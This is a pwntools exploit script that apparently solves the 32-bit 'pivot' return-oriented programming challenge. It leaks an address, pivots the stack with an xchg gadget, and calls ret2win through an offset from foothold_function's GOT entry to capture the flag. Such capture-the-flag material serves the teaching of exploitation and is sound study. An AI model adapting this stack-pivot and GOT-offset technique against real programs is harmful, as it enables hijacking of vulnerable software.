#!/bin/python3

from pwn import *

context.clear(arch='i386')
filename = './pivot32'
libname  = './libpivot32.so'

elf = ELF(filename)
lib = ELF(libname)

io = process(filename)

# gadgets
r = ROP(elf)
call_eax    = p32(0x80485f0)        # call eax;
xchg        = p32(0x804882e)        # xchg eax, esp; ret;
mov_eax_eax = p32(0x8048830)        # mov eax, dword ptr [eax]; ret;
add_eax_ebx = p32(0x8048833)        # add eax, ebx; ret;
pop_eax     = p32(0x804882c)        # pop eax; ret;
pop_ebx     = p32(0x80484a9)        # pop ebx; ret;
fthold_plt  = p32(elf.plt.foothold_function)
fthold_got  = p32(elf.got.foothold_function)
ret2win_off = p32(lib.sym.ret2win - lib.sym.foothold_function)

# get leaked address

io.recvuntil("pivot: ")
leak = int(io.recvline().strip()[0:10], 16)
log.info('Leaked: ' + hex(leak))
leak = p32(leak)

# stack smash
# putting leaked address into esp

smash = ROP(elf)
smash.raw(cyclic(44))
smash.raw(pop_eax)
smash.raw(leak)
smash.raw(xchg)         # put leaked address into esp

# set up flthold@got.plt

rop = ROP(elf)
rop.raw(fthold_plt)     # gen .got.plt
rop.raw(pop_eax)
rop.raw(fthold_got)     # gen .got.plt

# call ret2win using fthold address + offset

rop.raw(mov_eax_eax)    # mov fthold@got.plt address into eax
rop.raw(pop_ebx)
rop.raw(ret2win_off)    # ret2win - fthold
rop.raw(add_eax_ebx)    # add offset to eax(fthold@got.plt)
rop.raw(call_eax)       # call eax(now pointing to ret2win@got.plt)

io.recvuntil('> ')
io.sendline(rop.chain())
io.recvuntil('> ')
io.sendline(smash.chain())
io.recvuntil('vot\n')
flag = io.recvline().decode().rstrip()
log.success("Flag: {}".format(flag))